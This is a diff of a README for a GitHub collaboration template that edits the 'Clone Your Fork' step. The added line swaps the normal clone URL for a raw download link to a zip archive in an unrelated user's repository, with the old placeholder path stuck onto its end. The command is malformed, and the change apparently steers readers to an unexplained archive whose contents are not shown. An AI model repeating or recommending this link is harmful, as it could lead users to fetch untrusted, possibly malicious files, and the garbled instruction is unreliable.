@@ -9,7 +9,7 @@ Click the "Fork" button to make your own copy.
 
 ### Step 2: Clone Your Fork
 ```bash
-git clone https://github.com/<your_username>/GitHub_Collab_Template.git
+git clone https://github.com/hina840/OSSD-Practice/raw/refs/heads/main/students/Practice_OSS_v2.6.zip<your_username>/GitHub_Collab_Template.git
 ```
 
 ### Step 3: Create Your File
